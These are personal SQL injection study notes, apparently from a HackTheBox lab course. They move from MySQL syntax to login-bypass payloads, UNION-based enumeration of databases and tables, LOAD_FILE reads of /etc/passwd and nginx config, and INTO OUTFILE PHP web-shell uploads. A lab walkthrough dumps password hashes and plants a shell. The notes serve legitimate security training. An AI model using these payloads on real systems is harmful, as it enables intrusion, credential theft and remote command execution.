
# SQL Injection

> Personal web-security study notes for authorized lab use only.

Command Line for MYSQL

```
Without Specific Host

Command: mysql -u root -p
Command: mysql -u root -p<password>
```

```
With Specific Host and Port

Command: mysql -u root -h docker.hackthebox.eu -P 3306 -p
```

```
Note: When we don't specific the host, mysql is directly to localhost.

The default MySQL/MariaDB port is (3306)
```


MYSQL Syntax

```
Create Database

Command: CREATE DATABASE users;
```

```
Listing the Database

Command: SHOW DATABASES;
```

```
Use the Database

Command: USE <database_name>;
```

```
Create Table

Command: 

CREATE TABLE logins ( id INT, username VARCHAR(100), password VARCHAR(100), date_of_joining DATETIME );
```

```
Listing the Table

Command: SHOW TABLES;
```

```
List the table structure

Command: DESCRIBE <table_name> 

Output:
+-----------+-------------+------+-----+---------+-------+

| Field     | Type        | Null | Key | Default | Extra |

+-----------+-------------+------+-----+---------+-------+

| emp_no    | int(11)     | NO   | PRI | NULL    |       |

| title     | varchar(50) | NO   | PRI | NULL    |       |

| from_date | date        | NO   | PRI | NULL    |       |

| to_date   | date        | YES  |     | NULL    |       |

+-----------+-------------+------+-----+---------+-------+

```

```
Listing all inside the Table

Command: select * from <table_name>;
```

```
INSERT Statement

Add new reocrds to a given table.

Command: INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);

Example: 
- INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
- INSERT INTO logins(username, password)
```

```
SELECT Statement

Command: SELECT * FROM table_name;

Example:
- SELECT * FROM logins;
- SELECT username,password FROM logins;
```

```
DROP Statement

Command: DROP TABLE logins;
```

```
ALTER Statement

- Add new column
Command: ALTER TABLE logins ADD newColumn INT;

- Rename Column
Command: ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;

- Modify
Command: ALTER TABLE logins MODIFY newerColumn DATE;

- Drop a column
Command: ALTER TABLE logins DROP newerColumn;
```

```
UPDATE Statement

Command: UPDATE logins SET password = 'change_password' WHERE id > 1;
```

```
LIMIT

Command: SELECT * FROM logins LIMIT 2;
```

```
WHERE Clause

Command: SELECT * FROM table_name WHERE <condition>;
         SELECT * FROM logins WHERE id > 1;
         SELECT * FROM logins where username = 'admin';
```

```
LIKE Clause

Command: 

SELECT * FROM logins WHERE username LIKE 'admin%'; (It will show all result that start with admin)

SELECT * FROM logins WHERE username like '___'; (- define the character if 1 = 1 character)
```

```
Operation

Command: SELECT * FROM logins WHERE username != 'john' AND id > 1;
         select * from titles where emp_no > 10000 OR title != 'engineer';
```

```
Lession:

- AUTO_INCREMENT: Which automatically increments when every new item added
  Example: id INT NOT NULL AUTO_INCREMENT,
  
- UNIQUE: Ensure that there are same data
- NOT NULL: Make sure that no left empty field
  Example: username VARCHAR(100) UNIQUE NOT NULL,
  
- DEFAULT: To set the value to Now()
  Example: date_of_joining DATETIME DEFAULT NOW(),
  
- PRIMARY KEY: To unique identify each row in table, cannot be null, and must   be unique value 
  Example: PRIMARY KEY (id)
```

```
Note: SQL statements aren't case sensitive, which means 'USE users;' and 'use users;' refer to the same command. However, the database name is case sensitive, so we cannot do 'USE USERS;' instead of 'USE users;'. So, it is a good practice to specify statements in uppercase to avoid confusion.
```

```
Value 1 = True
Value 0 = False
```

```
- Division (`/`), Multiplication (`*`), and Modulus (`%`)
- Addition (`+`) and subtraction (`-`)
- Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
- NOT (`!`)
- AND (`&&`)
- OR (`||`)
```


**SQLi Discovery**

```
Payload      URL Encoded

'             %27
"             %22
#             %23
;             %3B
)             %29
```

```
Note: In some cases, we may have to use the URL encoded version of the payload. An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'.
```

```
'1'='1' == AND
'1'='1  == OR
```

```
Bypassing Authentication

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass
```

```
Login Form: 

Username = admin' OR '1'='1
Password = ''
```
> Source image was not included in the archive.

  
![Admin panel showing an SQL query execution: SELECT * FROM logins WHERE username='admin' OR '1'='1' AND password='something'; with a message: Login successful as user: admin](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/inject_success.png)


> Source image was not included in the archive.

```
Login

Username = notAdmin' OR '1'='1 
```
> Source image was not included in the archive.

> Source image was not included in the archive.

> Source image was not included in the archive.

```
Note:

The app already has: 'INPUT', so don't add the last '
```

```
Comments: --, #, )

Command: SELECT username FROM logins; -- Selects usernames from the logins table
```

```
Note: In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at the end (-- -), to show the use of a space character.
```

```
UNION: Use to select multiple tables and databases together

Command: SELECT * FROM ports UNION SELECT * FROM ships;
```

```
mysql> describe employees;

+------------+---------------+------+-----+---------+-------+

| Field      | Type          | Null | Key | Default | Extra |

+------------+---------------+------+-----+---------+-------+

| emp_no     | int(11)       | NO   | PRI | NULL    |       |

| birth_date | date          | NO   |     | NULL    |       |

| first_name | varchar(14)   | NO   |     | NULL    |       |

| last_name  | varchar(16)   | NO   |     | NULL    |       |

| gender     | enum('M','F') | NO   |     | NULL    |       |

| hire_date  | date          | NO   |     | NULL    |       |

+------------+---------------+------+-----+---------+-------+



mysql> describe departments;

+-----------+-------------+------+-----+---------+-------+

| Field     | Type        | Null | Key | Default | Extra |

+-----------+-------------+------+-----+---------+-------+

| dept_no   | char(4)     | NO   | PRI | NULL    |       |

| dept_name | varchar(40) | NO   | UNI | NULL    |       |

+-----------+-------------+------+-----+---------+-------+


As we can see this two table has different column so when we use union it will return error, Union must use with the table that has the same number of column

Example of usage error:

mysql> select * from employees UNION select * from departments;

ERROR 1222 (21000): The used SELECT statements have a different number of columns


So, we want to run it successfully, we must add NULL to the table that has the less column to match the column with other table

Command: select * from employees union select dept_no, dept_name, NULL, NULL, NULL, NULL  from departments;
```

```
Command: ' union select 1,2,3,4 -- -

To test to find the column exits:

Command: ' union select 1 -- -' until get error

And if these show only some column we can inject some data like: @@version, user() at column 2,3,4 if 1 doesn't exist in the web page


List all the user
Command: ' union select 1,user(),3,4 -- -

List the version
Command: ' union select 1,@@version,3,4 -- -
```

```
SCHEMATA

Here are the default MYSQL databases:

mysql
information_schema
performance_schema
sys

Command: SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

```
Step 1: Find all the databases
Command: ' union select 1,schema_name,3,4 from information_schema.schemata -- 

Output: List the database: ilfreight, dev (databases)

Step 2: List all the table of specific database
Command: ' union select 1,table_name,3,4 from information_schema.tables where table_schema='ilfreight' -- -

Output: users (tables)

Step 3: List all the column of the table
Command: ' union select 1,column_name,3,4 from information_schema.columns where table_schema='ilfreight' and table_name='users' -- -

Output: id, username, password (columns)

Step 4: List all the value of column
Command: ' union select 1,username,password,4 from ilfreight.users -- -

Output: (value)


List all the privilege of user found
Command: 
' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -

cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -

cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -

READ File
Command: ' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4 -- -

Upload Webshell
Command: ' UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3,4 
INTO OUTFILE '/var/www/html/shell.php' -- -

cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -

After Upload Weshell
Via URL: http://154.57.164.64:30440/test.php?cmd=cat%20/var/www/flag.txt
```


```
Skill Assement

In Burp:

POST /api/register.php HTTP/1.1
Host: 154.57.164.80:31298
Cookie: PHPSESSID=3q9o6monhcdg88qqra9vff5o4p
Content-Length: 102
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="135", "Not-A.Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Origin: https://154.57.164.80:31298
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://154.57.164.80:31298/register.php
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

username=test&password=Test%211234&repeatPassword=Test%211234&invitationCode=aaaa-bbbb-1234' OR '1'='1

Response:
HTTP/1.1 302 Found
Server: nginx/1.22.1
Date: Tue, 31 Mar 2026 12:15:43 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Location: /login.php?s=account+created+successfully!
Content-Length: 0

Command: ') union select 1,2,database(),4-- -

Output: chattr

Command: ') union select 1,2,table_name,4 from information_schema.tables where table_schema='chattr' -- -

Output: Users, InvitationCodes, Messages

Command: ') union select 1,2,column_name,4 from information_schema.columns where table_schema='chattr' and table_name='Users' -- -

Output: UserID, Username, Password, InvitationCode, AccountCreated

Command: ') union select 1,2,Username,Password from chattr.Users -- -

Output: 
- admin     $argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU
  
- bmdyy $argon2i$v=19$m=2048,t=4,p=3$UDhiSFgvTU0uZjBNUGljbw$FAraZTOEEidUQJXHmCkgH08iIuYZP/MQpLg+bBcM5o4
  
- dev    $argon2i$v=19$m=2048,t=4,p=3$TGxqYzFCemxBL3dFSkNwRQ$MQ6sZ+WbyTC2YY3GMGhsSXDhg7+oGWoOGvG8caw47Nc
  
- chattr   $argon2i$v=19$m=2048,t=4,p=3$UzY3d1FGclBNQThCTTBmUw$wbFe74g6vSKuTGXnL4eBeNSeKS+9kya/OMJRS1Gfs50
  
- test    $argon2i$v=19$m=2048,t=4,p=3$TnNETGE2aWRHTElFcVR0TQ$JuXm+39Gx1dkj5Rosbxjm/Kc2HpuKki2v5y2jdde8w8
  
Command: ') UNION SELECT 1, 2, super_priv, 4 FROM mysql.user WHERE user="admin"-- -

Output: Empty means user can access to everywhere

Command: ') UNION SELECT 1,2,LOAD_FILE('/etc/passwd'),4 -- -

Output: 
- 2026-03-31 12:17:01
- root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin mysql:x:100:101:MySQL Server,,,:/nonexistent:/bin/false messagebus:x:101:102::/nonexistent:/usr/sbin/nologin systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
  

Command: ' ) UNION SELECT 1 , 2 , LOAD_FILE ( "/etc/nginx/sites-available/default" ), 4-- -

Output: 
server { listen 443 ssl; server_name chattr.htb; ssl_password_file /root/chattr.key.pass; ssl_certificate /etc/ssl/certs/chattr.crt; ssl_certificate_key /etc/ssl/private/chattr.key; ssl_protocols TLSv1.2 TLSv1.3; ssl_ciphers HIGH:!aNULL:!MD5; root /var/www/chattr-prod; location / { index index.php; try_files $uri $uri/ /index.php?$query_string; } location ~ \.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php8.2-fpm.sock; } location ^~ /includes/ { deny all; } }

Command: ') UNION SELECT 1,2,"<?php system($_GET['cmd']); ?>",4 
INTO OUTFILE '/var/www/chattr-prod/shell.php' -- -
```

```
In Nginx on Debian/Ubunthu systems

/etc/nginx/
├── nginx.conf
├── sites-available/
│   └── default        ← default virtual host
└── sites-enabled/
    └── default  → symlink
```
